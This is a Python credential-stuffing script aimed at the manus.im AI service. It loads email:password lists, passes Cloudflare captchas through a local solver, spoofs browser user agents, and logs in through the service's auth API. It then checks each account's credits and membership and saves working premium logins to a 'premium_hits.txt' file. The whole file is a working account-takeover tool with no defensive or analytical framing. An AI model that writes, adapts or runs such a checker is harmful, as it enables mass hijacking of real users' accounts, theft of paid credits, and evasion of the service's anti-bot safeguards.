import requests
import random
import sys
import time
import os

# ==========================================
# ⚙️ Configuration
# ==========================================
CAPTCHA_SOLVER_URL = "http://127.0.0.1:6767/solve?url=https%3A%2F%2Fmanus.im%2F&sitekey=0x4AAAAAAA_sd0eRNCinWBgU"
INPUT_FILE = "accounts.txt"

# Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

def get_user_agent():
    mac_versions = ["10_15_7", "11_0", "12_0", "13_0", "14_0"]
    chrome_versions = ["120.0.0.0", "122.0.0.0", "125.0.0.0", "128.0.0.0"]
    mv = random.choice(mac_versions)
    cv = random.choice(chrome_versions)
    return f"Mozilla/5.0 (Macintosh; Intel Mac OS X {mv}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv} Safari/537.36"

def solve_captcha():
    try:
        response = requests.get(CAPTCHA_SOLVER_URL, timeout=90)
        if response.status_code == 200:
            data = response.json()
            if data.get("success") and "token" in data:
                return data["token"]
        return None
    except Exception:
        return None

def check_account(email, password):
    ua = get_user_agent()
    session = requests.Session()
    
    headers_base = {
        "User-Agent": ua,
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Referer": "https://manus.im/",
        "Connect-Protocol-Version": "1",
        "X-Client-Id": "oOyiiFQN6teedeGBWvq6ec",
        "X-Client-Locale": "en-GB",
        "X-Client-Timezone": "Europe/London",
        "X-Client-Timezone-Offset": "0",
        "X-Client-Type": "web",
        "Origin": "https://manus.im"
    }

    # 1. Captcha Bypass
    cf_token = solve_captcha()
    if not cf_token:
        return {"status": "ERROR", "msg": "Captcha Failed (No Solver)"}

    # 2. GetUserPlatforms
    url = "https://api.manus.im/user.v1.UserAuthPublicService/GetUserPlatforms"
    payload = {"email": email, "cfCaptchaCode": cf_token}
    
    try:
        res = session.post(url, headers=headers_base, json=payload, timeout=30)
        if res.status_code != 200:
            return {"status": "ERROR", "msg": f"HTTP {res.status_code}"}
            
        data = res.json()
        temp_token = data.get("tempToken")
        if not temp_token:
            return {"status": "DEAD", "msg": "Invalid Email / No TempToken"}

    except Exception as e:
        return {"status": "ERROR", "msg": "Connection Failed"}

    # 3. LoginByEmail
    url_login = "https://api.manus.im/user.v1.UserAuthPublicService/LoginByEmail"
    payload_login = {"email": email, "password": password, "token": temp_token}
    
    try:
        res_login = session.post(url_login, headers=headers_base, json=payload_login, timeout=30)
        data_login = res_login.json()
        
        if "token" not in data_login:
            return {"status": "DEAD", "msg": "Invalid Password / Blocked"}
            
        auth_token = data_login["token"]
        
    except Exception as e:
        return {"status": "ERROR", "msg": "Login Failed"}

    # 4. GetAvailableCredits
    url_credits = "https://api.manus.im/user.v1.UserService/GetAvailableCredits"
    headers_auth = headers_base.copy()
    headers_auth["Authorization"] = f"Bearer {auth_token}"
    headers_auth["Priority"] = "u=4"
    
    try:
        res_credits = session.post(url_credits, headers=headers_auth, json={}, timeout=30)
        if res_credits.status_code == 403:
            return {"status": "DEAD", "msg": "Banned / Blocked"}
        credits_data = res_credits.json()
        credits = credits_data.get("totalCredits", "0")
    except:
        credits = "0"

    # 5. UserInfo
    url_info = "https://api.manus.im/user.v1.UserService/UserInfo"
    try:
        res_info = session.post(url_info, headers=headers_auth, json={}, timeout=30)
        info_data = res_info.json()
        membership = info_data.get("membershipVersion", "Unknown")
        user_type = info_data.get("userType", "Unknown")
        task_limit = info_data.get("concurrentScheduleTaskLimit", "Unknown")
    except:
        membership, user_type, task_limit = "Unknown", "Unknown", "Unknown"

    result_str = f"Credits: {credits} | Mem: {membership} | Type: {user_type} | Limits: {task_limit}"
    
    if "free" in str(membership).lower() or "free" in str(user_type).lower() or str(membership) == "0":
        return {"status": "FREE", "msg": result_str}
    else:
        return {"status": "HIT", "msg": result_str}

def main():
    if not os.path.exists(INPUT_FILE):
        print(f"{RED}[!] File {INPUT_FILE} not found!{RESET}")
        sys.exit()

    with open(INPUT_FILE, "r") as f:
        accounts = [line.strip() for line in f if ":" in line]

    print(f"[*] Loaded {len(accounts)} accounts. Starting...\n")

    for acc in accounts:
        parts = acc.split(":", 1)
        email, pwd = parts[0], parts[1]
        
        result = check_account(email, pwd)
        
        if result["status"] == "HIT":
            print(f"{GREEN}[HIT - PREMIUM] {email}:{pwd} -> {result['msg']}{RESET}")
            with open("premium_hits.txt", "a") as out:
                out.write(f"{email}:{pwd} | {result['msg']}\n")
        elif result["status"] == "FREE":
            print(f"{YELLOW}[HIT - FREE] {email}:{pwd} -> {result['msg']}{RESET}")
        elif result["status"] == "DEAD":
            print(f"{RED}[DEAD] {email} -> {result['msg']}{RESET}")
        else:
            print(f"{CYAN}[ERROR] {email} -> {result['msg']}{RESET}")
            
        time.sleep(1)

if __name__ == "__main__":
    main()
